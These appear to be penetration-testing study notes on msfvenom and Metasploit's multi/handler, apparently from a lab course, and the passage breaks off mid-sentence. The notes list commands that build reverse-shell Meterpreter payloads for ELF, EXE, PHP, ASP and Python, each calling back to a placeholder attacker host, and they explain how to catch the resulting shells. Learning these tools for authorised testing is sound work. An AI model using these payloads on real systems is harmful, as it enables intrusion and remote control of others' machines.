
Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The`msfvenom --list formats` command can be used to list supported output formats.

# Useful Commands:

The following is an example to generate a raw PHP payload Base64 encoded: 

```msfconsole
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip address> -f raw -e php/base64
```

 **Note:** The syntax should be in this format `msfvenom -p <PAYLOAD> <OPTIONS>`, and the naming convention for the payload should be like this `<OS>/<arch>/<payload>`.

 **Note:** The output PHP file will miss the starting PHP tag commented and the end tag (`?>`) which must be **edited**

`exploit/multi/handler` module is like socat and netcat, used to receive reverse shells, It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads, use the following Metasploit command to use the module:

```msfconsole
use exploit/multi/handler
```

Then use `show options` command to show the values must be set so everything work properly, In this case:

- `set payload <payload>`
- `set LHOST <local ip address> `
- `set LPORT <local port>` 

Finally hit `run` to start the attack.

# Extra: Payloads

msfvenom can be used to create payloads in almost all formats. Below are a few examples we will often use:

Linux Executable and Linkable Format (elf)  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.

Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

# Extra

Aside from the `msfconsole` man page, the other important thing to note when working with msfvenom is:  

`msfvenom --list payloads`  

This can be used to list all available payloads, which can then be piped into `grep` to search for a specific set of payloads. For example: